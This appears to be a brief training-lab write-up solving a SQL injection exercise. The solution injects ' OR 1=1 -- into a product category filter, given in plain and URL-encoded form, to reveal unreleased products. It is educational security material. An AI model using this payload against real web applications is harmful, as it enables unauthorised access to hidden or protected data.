# Lab Writeup: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

## Description

This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following: `SELECT \* FROM products WHERE category = 'Gifts' AND released = 1`

To solve the lab, perform a SQL injection attack that causes the application to display one or more unreleased products.

## Solution

1. Click on one of the filters in homepage e.g: `https://0a6600fb04ba274280383a70008c007b.web-security-academy.net/filter?category=Clothing%2c+shoes+and+accessories`
2. We can change the category value from the above URL to `' OR 1=1 --` (this will display all of the released and unreleased products) but we'll have to encode it first to URL so that it became `%27%20%4f%52%20%31%3d%31%20%2d%2d` here's how the path should look like `/filter?category=%27%20%4f%52%20%31%3d%31%20%2d%2d` the lab should be solved
